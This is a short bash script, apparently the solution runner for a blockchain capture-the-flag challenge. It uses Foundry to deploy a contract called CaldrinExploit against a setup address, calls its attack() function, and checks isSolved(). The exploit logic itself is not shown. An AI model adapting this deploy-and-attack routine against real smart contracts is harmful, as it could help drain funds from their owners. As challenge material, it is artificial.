#!/usr/bin/env bash
set -euo pipefail

: "${RPC_URL:?set RPC_URL}"
: "${PRIVATE_KEY:?set PRIVATE_KEY}"
: "${SETUP_ADDRESS:?set SETUP_ADDRESS}"

FOUNDRY_BIN="$(dirname "$(command -v forge)")"
FORGE="$FOUNDRY_BIN/forge"
CAST="$FOUNDRY_BIN/cast"

"$FORGE" build >/dev/null

EXPLOIT="$(
  "$FORGE" create \
    --rpc-url "$RPC_URL" \
    --private-key "$PRIVATE_KEY" \
    --broadcast \
    --json \
    src/CaldrinExploit.sol:CaldrinExploit \
    --constructor-args "$SETUP_ADDRESS" |
  jq -r '.deployedTo'
)"

echo "Exploit: $EXPLOIT"
"$CAST" send \
  --rpc-url "$RPC_URL" \
  --private-key "$PRIVATE_KEY" \
  "$EXPLOIT" \
  'attack()'

echo -n "Solved: "
"$CAST" call --rpc-url "$RPC_URL" "$SETUP_ADDRESS" 'isSolved()(bool)'
